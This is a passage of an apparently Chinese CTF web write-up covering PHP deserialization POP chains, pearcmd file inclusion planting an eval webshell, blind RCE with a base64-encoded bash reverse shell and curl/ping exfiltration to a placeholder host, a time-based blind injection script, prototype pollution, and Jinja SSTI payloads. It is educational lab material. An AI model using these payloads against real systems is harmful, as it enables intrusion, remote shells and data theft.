&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);    <br>    &#125;<br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br></code></pre></td></tr></table></figure><p>从destruct开始，触发tostring，接着触发invoke，然后是call，将Handle的obj设置为CTF，可触发unset，然后触发WhiteGod的unset，然后传入命令</p><p>payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br> <br>        <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>();<br> <br>        <span class="hljs-variable language_">$this</span>-&gt;func=<span class="hljs-variable">$a</span>;<br> <br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span><br><span class="hljs-function">    </span>&#123;<br> <br>        <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>();<br> <br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br> <br>        <span class="hljs-variable language_">$this</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>();<br> <br>    &#125; <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br> <br>        <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>();<br> <br>        <span class="hljs-variable language_">$this</span>-&gt;handle=<span class="hljs-variable">$b</span>;<br> <br>    &#125;  <br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&quot;system&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;ls /&quot;</span>;<br><br>&#125;<br><br><span class="hljs-variable">$begin</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>();<br><span class="hljs-variable">$begin</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$begin</span>));<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>官方的更加简洁：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;   <br>     <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;    <br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;        <br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$a</span>;    <br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;    <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;        <br>        <span class="hljs-variable language_">$this</span>-&gt;func= <span class="hljs-variable">$a</span>;    <br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;        <br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-variable">$a</span>;    <br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;        <br>        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-variable">$a</span>;    <br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;        <br>        <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-variable">$a</span>;    <br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span>&#123;       <br>        <span class="hljs-variable language_">$this</span>-&gt;func = <span class="hljs-variable">$a</span>;        <br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-variable">$b</span>;    <br>    &#125;<br>&#125;<br><span class="hljs-comment">// POP Gadget: // Begin::__destruct -&gt; Then::toString -&gt; Super::__invoke -&gt; Handle::__call -&gt; CTF::end -&gt; WhiteGod::__unset</span><br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Begin</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Then</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Super</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Handle</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CTF</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WhiteGod</span>(<span class="hljs-string">&quot;readfile&quot;</span>,<span class="hljs-string">&quot;/flag&quot;</span>))))));<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br></code></pre></td></tr></table></figure><h3 id="web-medium-sql"><a href="#web-medium-sql" class="headerlink" title="web-medium_sql"></a>web-medium_sql</h3><p>布尔盲注</p><p>自己写的脚本效率不高，返回的结果也不准确，没有经过优化(虽然能用),<del>脚本++</del></p><h3 id="web-Include-🍐"><a href="#web-Include-🍐" class="headerlink" title="web-Include 🍐"></a>web-Include 🍐</h3><p>考点: php pearcmd文件包含</p><p>原理: 在register_argc_argv为on的环境下，通过包含pearcmd.php和传参可实现rce</p><p>常规payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?+config-create+<span class="hljs-regexp">/&amp;file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd.php&amp;<span class="hljs-regexp">/&lt;?=phpinfo()?&gt;+/</span>tmp/hello.php<br></code></pre></td></tr></table></figure><p>payload(本题不太一样，后面帮你加了php):</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?+config-create+<span class="hljs-regexp">/&amp;file=/u</span>sr<span class="hljs-regexp">/local/</span>lib<span class="hljs-regexp">/php/</span>pearcmd&amp;<span class="hljs-regexp">/&lt;?=@eval($_GET[1]);?&gt;+/</span>tmp/hello.php<br></code></pre></td></tr></table></figure><p><strong>（这里有个坑，直接url中get传参会把&lt;这些字符自动编码，就成功不了，所以用burp抓包再改传参）</strong>,后面又很奇怪，burp访问文件400了，但是页面直接访问却可以</p><p>然后文件包含即可进行RCE</p><h3 id="web-R-C-E-1"><a href="#web-R-C-E-1" class="headerlink" title="web-R!!C!!E!!"></a>web-R!!C!!E!!</h3><p>无回显RCE</p><p>一道题目，看wp，学到了四种姿势:</p><p><strong>第一种</strong></p><p>非预期解，写入文件，然后访问,exp如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$a</span>-&gt;code=<span class="hljs-string">&quot;ls / | script /var/www/html/2&quot;</span>;<br><span class="hljs-comment">//$a-&gt;code=&quot;ls / | te&#x27;&#x27;e /var/www/html/1&quot;; 或者</span><br><span class="hljs-variable">$a</span>-&gt;qwejaskdjnlka=<span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>第二种</strong></p><p>反斜杠绕过+反弹shell，exp如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">minipop</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>=<span class="hljs-string">&quot;bas\h -c &#x27;echo YmFzaCAtxxxxxxxxxxxxxxxxxxMTkuMTYwLjEzMC8xMDAgMD4mMQ== | ba\se64 -d| bas\h -i&#x27;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$qwejaskdjnlka</span>;<br> <br>&#125;<br><span class="hljs-variable">$one</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">minipop</span>();<br><span class="hljs-variable">$one</span>-&gt;qwejaskdjnlka=<span class="hljs-variable">$one</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$one</span>);<br><br><span class="hljs-comment">//#其中echo后面的部分是 bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 这样的，需要自己修改ip和端口</span><br></code></pre></td></tr></table></figure><p>一开始死活不行，后面发现是hackbar问题，此题hackbarV2能用</p><p><strong>第三种</strong></p><p>dnslog外带,不过复现的时候，没打出来</p><p>贴上网上找到的资料，之后也许会用到🤔</p><p><strong>http外带</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">curl your_own_ip.com/<span class="hljs-string">`whoami`</span><br></code></pre></td></tr></table></figure><p><strong>ICMP 外带</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ping -c <span class="hljs-number">1</span> `whoami`.your_own_ip.com<br></code></pre></td></tr></table></figure><p>注意，命令执行的结果中，常常会有空格等等特殊字符，这个时候使用 base64 编码即可：<br><code>curl your_own_ip.com/$(whoami|base64)</code></p><p><strong>第四种</strong></p><p>bash盲注，exp如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;http://de1ff2b8-aeac-425f-a8d3-cdbb643daa29.node4.buuoj.cn:81/&quot;</span><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):<br>    <span class="hljs-comment"># cat /flag的时候j可以调大一点,在ls的时候调小一点</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">15</span>):<br>        <span class="hljs-comment">#ascii码表</span><br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>            time.sleep(<span class="hljs-number">0.3</span>)<br>            k=<span class="hljs-built_in">chr</span>(k)<br>            payload =<span class="hljs-string">f&quot;if [ `ls / | awk NR==<span class="hljs-subst">&#123;i&#125;</span> | cut -c <span class="hljs-subst">&#123;j&#125;</span>` == &#x27;<span class="hljs-subst">&#123;k&#125;</span>&#x27; ];then sleep 2;fi&quot;</span><br>            length=<span class="hljs-built_in">len</span>(payload)<br>            payload2 =&#123;<br>                <span class="hljs-string">&quot;payload&quot;</span>: <span class="hljs-string">&#x27;O:7:&quot;minipop&quot;:2:&#123;&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;&#123;s:4:&quot;code&quot;;s:&#123;0&#125;:&quot;&#123;1&#125;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(length,payload)<br>            &#125;<br>            t1=time.time()<br>            r=requests.post(url=url,data=payload2)<br>            t2=time.time()<br>            <span class="hljs-keyword">if</span> t2-t1 &gt;<span class="hljs-number">1.9</span>:<br>                result+=k<br>                <span class="hljs-built_in">print</span>(result)<br><br>    result += <span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure><h3 id="web-OtenkiGirl"><a href="#web-OtenkiGirl" class="headerlink" title="web-OtenkiGirl"></a>web-OtenkiGirl</h3><p>原型链污染，看leavesong的博客之后再来理解这道题会好一点</p><p>打开题目，随便提交一些信息，然后抓包，可以发现两个请求地址</p><p>获取信息:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/info/0</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure><p>提交信息：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br></code></pre></td></tr></table></figure><p>提交信息必须为 JSON 格式，<code>contact</code>和<code>reason</code>字段是必须的，例如</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span>  </span><br><span class="language-json"><span class="hljs-attr">&quot;contact&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>  </span><br><span class="language-json"><span class="hljs-attr">&quot;reason&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>查看题目附件，发现有个hint，查看，说不是sql注入，再结合附件可猜测是原型链污染</p><p>查看<code>routes/info.js</code>源码，考察从数据库中获取数据的函数<code>getInfo</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getInfo</span>(<span class="hljs-params">timestamp</span>) &#123;    <br>    timestamp = <span class="hljs-keyword">typeof</span> timestamp === <span class="hljs-string">&quot;number&quot;</span> ? timestamp : <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();    <span class="hljs-comment">// Remove test data from before the movie was released</span><br>    <span class="hljs-keyword">let</span> minTimestamp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-variable constant_">CONFIG</span>.<span class="hljs-property">min_public_time</span> || <span class="hljs-variable constant_">DEFAULT_CONFIG</span>.<span class="hljs-property">min_public_time</span>).<span class="hljs-title function_">getTime</span>();    <br>    timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(timestamp, minTimestamp);    <br>    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> sql.<span class="hljs-title function_">all</span>(<span class="hljs-string">`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp &gt;= ?`</span>, [timestamp]).<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> &#123; <span class="hljs-keyword">throw</span> e &#125;);   <br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中第4行和第5行将我们传入的<code>timestamp</code>做了一个过滤，使得所返回的数据不早于配置文件中的<code>min_public_time</code></p><p>查看根目录下的<code>config.js</code>和<code>config.default.js</code>后发现<code>config.js</code>并没有配置<code>min_public_time</code>，因此<code>getInfo</code>的第5行只是采用了<code>DEFAULT_CONFIG.min_public_time</code></p><p>考虑原型链污染污染<code>min_public_time</code>为我们想要的日期，就能绕过最早时间限制，获取任意时间的数据</p><p>查看<code>routes/submit.js</code>源码，发现注入点</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title function_">merge</span> = (<span class="hljs-params">dst, src</span>) =&gt; &#123;    <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> dst !== <span class="hljs-string">&quot;object&quot;</span> || <span class="hljs-keyword">typeof</span> src !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> dst;    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> src) &#123;       <br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> dst &amp;&amp; key <span class="hljs-keyword">in</span> src) &#123;<br>            dst[key] = <span class="hljs-title function_">merge</span>(dst[key], src[key]);        <br>        &#125; <span class="hljs-keyword">else</span> &#123;           <br>            dst[key] = src[key];        <br>        &#125;   <br>    &#125;    <br>    <span class="hljs-keyword">return</span> dst;&#125;<br><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">merge</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br></code></pre></td></tr></table></figure><p>其中<code>merge</code>函数第7行存在原型链污染，因此只要考虑注入<code>data[&#39;__proto__&#39;][&#39;min_public_time&#39;]</code>的值即可</p><p>于是构造<code>payload</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/submit</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span>  </span><br><span class="language-json"><span class="hljs-attr">&quot;contact&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>  </span><br><span class="language-json"><span class="hljs-attr">&quot;reason&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;test&quot;</span><span class="hljs-punctuation">,</span>  </span><br><span class="language-json"><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>    </span><br><span class="language-json"><span class="hljs-attr">&quot;min_public_time&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1001-01-01&quot;</span>  </span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>然后为我们再请求<code>/info/0</code>,，抓包里面请求即可，然后会把Content-Type错，修改即可在response里面看到flag</p><h3 id="web-Genshin"><a href="#web-Genshin" class="headerlink" title="web-Genshin"></a>web-Genshin</h3><p>F12，网络请求，在http响应包里发现一个路由，访问进去</p><p>fuzz测试，发现过滤了双层大括号，’，request，init，lipsum，popen</p><p>官方payload:</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">&#123;% print(<span class="hljs-name">get_flashed_messages.__globals__.os</span>[<span class="hljs-string">&quot;pop&quot;</span>+<span class="hljs-string">&quot;en&quot;</span>](<span class="hljs-string">&quot;cat /flag&quot;</span>).read()) %&#125;<br></code></pre></td></tr></table></figure><p>其他payload:</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&#123;%print(<span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">132</span>].<span class="hljs-variable">__enter__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&quot;pop&quot;</span>+<span class="hljs-string">&quot;en&quot;</span>](<span class="hljs-string">&quot;cat /flag&quot;</span>).read())%&#125;<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">?name=&#123;%print<span class="hljs-string">&quot;&quot;</span>|attr(<span class="hljs-string">&quot;__class__&quot;</span>)|attr(<span class="hljs-string">&quot;__base__&quot;</span>)|attr(<span 